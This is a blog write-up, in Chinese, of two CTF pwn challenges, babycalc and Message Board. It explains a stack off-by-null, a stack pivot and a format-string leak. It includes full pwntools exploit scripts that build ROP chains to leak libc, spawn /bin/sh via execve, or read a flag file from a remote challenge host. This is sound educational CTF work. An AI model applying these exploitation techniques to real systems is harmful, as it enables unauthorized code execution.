---
title: 2023西湖论剑pwn-babycalc题解
id: 123
date: 2024-01-09 20:09:12
auther: yrl
cover: 
excerpt: babycalc (stack offbynull、抬高rbp、stackoverflow)题目没有开沙箱，环境是2.23的glibc，看下int sub_400789()大概逻辑  char v0; // al  char buf[208]; // [rsp+0h] [rbp-100h] BYR
permalink: /archives/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91pwn-babycalc%E9%A2%98%E8%A7%A3
categories:
 - pwn-wp
tags: 
 - ctf
---

# babycalc (stack offbynull、抬高rbp、stackoverflow)

题目没有开沙箱，环境是2.23的glibc，看下int sub_400789()大概逻辑:
```c

  char v0; // al
  char buf[208]; // [rsp+0h] [rbp-100h] BYREF
  unsigned __int8 v3; // [rsp+D0h] [rbp-30h]
  unsigned __int8 v4; // [rsp+D1h] [rbp-2Fh]
  unsigned __int8 v5; // [rsp+D2h] [rbp-2Eh]
  unsigned __int8 v6; // [rsp+D3h] [rbp-2Dh]
  unsigned __int8 v7; // [rsp+D4h] [rbp-2Ch]
  unsigned __int8 v8; // [rsp+D5h] [rbp-2Bh]
  unsigned __int8 v9; // [rsp+D6h] [rbp-2Ah]
  unsigned __int8 v10; // [rsp+D7h] [rbp-29h]
  unsigned __int8 v11; // [rsp+D8h] [rbp-28h]
  unsigned __int8 v12; // [rsp+D9h] [rbp-27h]
  unsigned __int8 v13; // [rsp+DAh] [rbp-26h]
  unsigned __int8 v14; // [rsp+DBh] [rbp-25h]
  unsigned __int8 v15; // [rsp+DCh] [rbp-24h]
  unsigned __int8 v16; // [rsp+DDh] [rbp-23h]
  unsigned __int8 v17; // [rsp+DEh] [rbp-22h]
  unsigned __int8 v18; // [rsp+DFh] [rbp-21h]
  int i; // [rsp+FCh] [rbp-4h]
  for ( i = 0; i <= 15; ++i )
  {
    printf("number-%d:", (unsigned int)(i + 1));
    buf[(int)read(0, buf, 0x100uLL)] = 0; <-----buf溢出 & offbynull
    v0 = strtol(buf, 0LL, 10);
    *(&v3 + i) = v0; <------ 越界写一字节
  }
```
观察代码发现buf存在溢出，但溢出的长度刚好到rbp截止，但是由于给最后一位赋值0，导致栈上的offbynull，可实现讲rbp抬高到buf区域；

然后本质上buf溢出可覆盖下面的变量v3和i，使得`*(&v3 + i) = v0`时可在v3+0xff范围内任意写一字节。

通过这两个漏洞，我们先将rbp抬高到buf区域，然后sub_400789()修改返回地址为`leave ret`,将栈迁移到buf区域，执行buf中提前布置好的rop链。

步骤：

1. 修改rbp最后一字节为0
2. 修改sub_400789函数返回地址为`leave ret`
3. 执行rop泄露libc并返回main
4. 再次执行相同操作rop拿shell

**涉及技术点** 

1. stack offbynull
2. 栈溢出
3. 抬高rbp，leave ret栈迁移
4. ret 滑栈

**补充说明**

1. 代码后面是一个解方程，用z3解出即可（z3有多解，需要选择正确的那个），只有解出方程函数才能正常返回。
2. rbp的地址是变化的，导致覆盖低字节为0后栈迁移地址是不固定的，可以在buf中填充ret指令可以让执行流滑行到rop链，可以大大减少爆破次数。

exp：
```python
# -*- coding: UTF-8 -*-
from pwn import *
from z3 import *
import sys
from pwnlib.util.iters import mbruteforce 

context.log_level = 'debug'
python_version = sys.version_info.major
context.terminal = ["/bin/tmux","sp","-h"]
context(arch='amd64',os='linux')

debug = False if "r" in sys.argv else True

vuln_name = "./babycalc"
libc_path = "/home/yrl/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6"
libc_source_path = "/home/yrl/glibc-all-in-one/libs-src/glibc-2.36"
libc_symbol_path = "/home/yrl/glibc-all-in-one/libs/2.36-0ubuntu4_amd64/.debug/d1/704d25fbbb72fa95d517b883131828c0883fe9.debug"

elf, rop = ELF(vuln_name), ROP(vuln_name)
libc, roplibc = ELF(libc_path), ROP(libc_path)
os.system("chmod +x " + vuln_name)

if debug:
    io = process([vuln_name],env={'LD_PRELOAD':libc_path})
else:
    io = remote("tcp.cloud.dasctf.com", 28504)

def debug(io, gdb_script):
    if gdb_script != None:
        gdb.attach(io,gdb_script.format(libc_symbol_path=libc_symbol_path,libc_source_path=libc_source_path))
    gdb.attach(io)
    pause()

def get_libc_gadget(rop_gadget):
    if python_version == 2:
        gadget = libc.search(rop_gadget).next() if rop_gadget == '/bin/sh\x00' else libc.search(asm(rop_gadget)).next()
    else:
        gadget = libc.search(rop_gadget).__next__() if rop_gadget == b'/bin/sh\x00' else libc.search(asm(rop_gadget)).__next__()
    return gadget

    
gdb_script='''
source /home/yrl/loadsym.py
loadsym {libc_symbol_path}
dir {libc_source_path}
dir {libc_source_path}/libio
'''
l64 = lambda      :u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
l32 = lambda      :u32(io.recvuntil(b"\xf7")[-4:].ljust(4,b"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a.encode(),b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x.encode()) if python_version == 3 and type(x) == str else io.sendline(x)
sa = lambda a,b		: io.sendafter(a.encode(),b.encode()) if python_version == 3 and type(b) == str else io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a.encode(),b.encode()) if python_version == 3 and type(b) == str else io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : debug(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, b'\x00'))
uu64 = lambda data		: u64(data.ljust(8, b'\x00'))
ur64 = lambda data		: u64(data.rjust(8, b'\x00'))

'''
a = [z3.BitVec("p%d" % i, 8)for i in range(16)]

s=Solver()

s.add(a[2]*a[1]*a[0]-a[3]==0x8D56)
s.add(a[0]==19)
s.add(a[2]*19*a[1] + a[3]==36322)
s.add((a[10] + a[0]-a[5])*a[13]==32835)
s.add((a[1]*a[0]-a[2])*a[3]==0xAC8A)
s.add((a[2] + a[1]*a[0])*a[3]==0xC986)
s.add(a[6]*a[5]*a[4]-a[7]==0xF06D)
s.add(a[7]*a[12] + a[1] + a[15]==0x4A5D)
s.add(a[6]*a[5]*a[4] + a[7]==0xF1AF)
s.add((a[5]*a[4]-a[6])*a[7]==0x8E03D)
s.add(a[8]==50)
s.add((a[6] + a[5]*a[4])*a[7]==0x8F59F)
s.add(a[10]*a[9]*a[8]-a[11]==0x152FD3)
s.add(a[10]*a[9]*a[8] + a[11]==0x15309D)
s.add((a[9]*a[8]-a[10])*a[11]==0x9C48A)
s.add((a[8]*a[2]-a[13])*a[9]==0x4E639)
s.add((a[10] + a[9]*a[8])*a[11]==0xA6BD2)
s.add(a[14]*a[13]*a[12]-a[15]==0x8996D)
s.add(a[14]*a[13]*a[12] + a[15]==0x89973)
s.add(a[11]==0x65)
s.add((a[13]*a[12]-a[14])*a[15]==0x112E6)
s.add((a[14] + a[13]*a[12])*a[15]==0x11376)


while(s.check()==sat):

  answer=s.model()
  flag = []
  for i in range(len(answer)):
    #print (input[i])
    # flag.append(answer[a[i]].as_long())
    flag.append(answer[a[i]].as_long())
  # print (flag)
  #print(flag)
  #dbg()
  io = process([vuln_name],env={'LD_PRELOAD':libc_path})
  sla('number-1:',str(flag[0]))

  for i in range(1,15):
	sla('number-%d:'%(i+1),str(flag[i]))
  sla('number-16:',str(flag[15]))
  try:
	  re = io.recvall()
	  if 'good done' in re:
	      print(flag)
	      break

  except:
  	continue
# flag = ['19', '36', '53', '70', '55', '66', '17', '161', '50', '131', '212', '101', '118', '199', '24', '3']
'''

main = 0x400C1A
pop_rdi = 0x0000000000400ca3
pop_rsi = 0x0000000000400ca1
putsplt = elf.plt['puts']
putsgot = elf.got['puts']
ret = 0x400C19

rop = p64(pop_rdi) + p64(putsgot) + p64(putsplt) + p64(main)
pay = '24'.ljust(0x8,'a')
pay += p64(ret) * (0x19-4)
pay += rop
pay += '\x13\x24\x35\x46\x37\x42\x11\xa1\x32\x83\xd4\x65\x76\xc7\x18\x03' + 'b' * 0x1c + '\x38\x00\x00\x00'
sa('number-1:',  pay)


libc.address = l64() - libc.symbols['puts']
lg('libc.address')
execve = libc.symbols['execve']
lg('execve')
binsh = get_libc_gadget('/bin/sh\x00')
lg('binsh')
pop_rdx = get_libc_gadget('pop rdx;ret')
pop_rsi = get_libc_gadget('pop rsi;ret')

rop = p64(pop_rdi) + p64(binsh) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) +p64(execve)
pay = '24'.ljust(0x8,'a')
pay += p64(ret) * (0x19-7)
pay += rop
pay += '\x13\x24\x35\x46\x37\x42\x11\xa1\x32\x83\xd4\x65\x76\xc7\x18\x03' + 'b' * 0x1c + '\x38\x00\x00\x00'
#dbg()
sa('number-1:',  pay)

irt()

```
# Message Board(fmt,stackoverflow、orw)

格式化字符串8byte，可泄露栈地址，接着泄露libc，栈迁移到bss段进行orw

```python
from pwn import *
import time

context.log_level = 'debug'
#context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./pwn"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    # io = process(vuln_path)
    io = process([vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("tcp.cloud.dasctf.com", 21495)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


# leack stack
io.sendlineafter("your name:\n", "%5$p")
io.recvuntil("0x", drop=True)

buf_stack = int(io.recv()[:12], 16) + 8
success("buf_stack -> " + hex(buf_stack))

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
read_plt = elf.plt['read']
leave_ret = 0x4012e1
pop_rdi_ret = 0x0401413
main_addr = 0x4012E3

# return -> main ->leak libc
payload = p64(0) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
payload = payload.ljust(0xB0, b"\x00")
payload += p64(buf_stack) + p64(leave_ret)

io.send(payload)

libc_puts = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
libc.address = libc_puts - libc.symbols["puts"]
success("libc address -> " + hex(libc.address))

pop_rsi = roplibc.rsi.address + libc.address
pop_rdi = roplibc.rdi.address + libc.address
pop_rdx = roplibc.rdx.address + libc.address
openaddr = libc.symbols['open']
readaddr = libc.symbols['read']
writeaddr = libc.symbols['write']

bssaddr = 0x404080 + 0x100

# orw
new_buf_address = buf_stack - 144
payload = p64(0) + p64(pop_rdi) + p64(new_buf_address + 8 * 20) + p64(pop_rsi) + p64(0) + p64(openaddr) #open
payload += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(bssaddr + 0x50) + p64(pop_rdx) + p64(0x30) + p64(readaddr) #read
payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(bssaddr + 0x50) + p64(pop_rdx) + p64(0x30) + p64(writeaddr) # write
payload += b"./flag\x00"
payload = payload.ljust(0xB0, b"\x00")
payload += p64(new_buf_address) + p64(leave_ret)

io.sendlineafter("DASCTF:\n", payload)

io.interactive()
```